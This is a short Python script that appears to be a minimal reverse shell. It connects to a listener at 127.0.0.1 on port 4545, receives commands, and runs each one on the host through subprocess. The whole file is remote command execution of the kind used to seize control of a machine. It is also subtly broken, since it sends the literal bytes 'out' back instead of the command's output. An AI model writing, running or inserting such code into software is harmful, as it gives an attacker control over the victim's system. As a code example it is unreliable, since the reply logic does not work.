
import socket
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4545))

while True:
 cmd=s.recv(1024)
 print(cmd)
 out=subprocess.getoutput(cmd)
 s.send(b"out")